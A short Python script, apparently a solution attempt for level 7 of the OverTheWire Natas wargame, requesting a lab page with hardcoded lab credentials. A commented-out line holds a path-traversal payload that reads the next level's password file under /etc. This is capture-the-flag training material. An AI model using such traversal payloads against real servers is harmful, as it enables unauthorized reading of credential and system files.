import requests
#http://docs.python-requests.org/en/master/
#payload={'page':'../../../../../etc/natas_webpass/natas8'}
payload={'page':'about'}

url="http://natas7.natas.labs.overthewire.org/index.php"


r=requests.get(url, data=payload, auth=('natas7','7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'))

print r.text
